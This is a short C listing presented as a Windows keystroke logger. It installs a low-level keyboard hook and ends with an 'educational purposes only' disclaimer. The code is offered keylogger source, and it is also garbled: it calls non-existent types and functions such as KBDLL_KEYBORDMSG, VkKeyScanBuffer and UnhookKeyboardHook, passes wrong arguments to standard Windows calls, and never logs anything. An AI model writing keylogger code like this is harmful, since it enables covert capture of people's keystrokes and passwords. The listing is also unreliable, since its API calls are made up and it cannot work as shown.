### Full Code:
```c
#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <iostream>

typedef void (*WndProc)(HWND, uMsg, WPARAM, LPARAM);
HWND hwnd;
int hook;

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLL_KEYBORDMSG keyEvent;
    if (wParam < 0) {
        keyEvent.length = MAKELONG((ULONG)(lParam & 0xFFFF), (ULONG)(lParam >> 16));
        keyEvent.keyOptions = (lParam & 0x00010000) ? KKEYS_OPTION_KEYDEAD : 0;
    } else {
        keyEvent.length = 1;
        keyEvent.keyOptions = 0;
        keyEvent.keysym = wParam;
    }
    if (wParam == VK_KEYDOWN) {
        if (keyEvent.keysym == 0x00) {
            char c = (char)VkKeyScanBuffer(keyEvent.keysym, 0);
            SendKeys(hwnd, c);
        }
    }
    return 0;
}

void SendKeys(HWND hwnd, char c) {
    INPUT input;
    input.type = INPUT_KEYDOWN;
    input.unionKey.key = c;
    SendInput(hwnd, 1, &input);
}

int main() {
    hwnd = CreateWindowEx(WS_OVERLAPPED | WS_DLGownik, "Keystroke Logger", 0, 0, 0, 0, HWND_DESKTOP, 0, WS_HWNDForeground | WS_VSCROLL | ES_CONTINUOUS | ES_OWNED, nullptr, nullptr, nullptr, nullptr);
    hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
    MSG msg;
    while (GetMessage(hwnd, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookKeyboardHook(hook);
    return 0;
}
```

### Notes:
- This code is for educational purposes only. Always ensure you have proper permissions and permissions to log keystrokes.
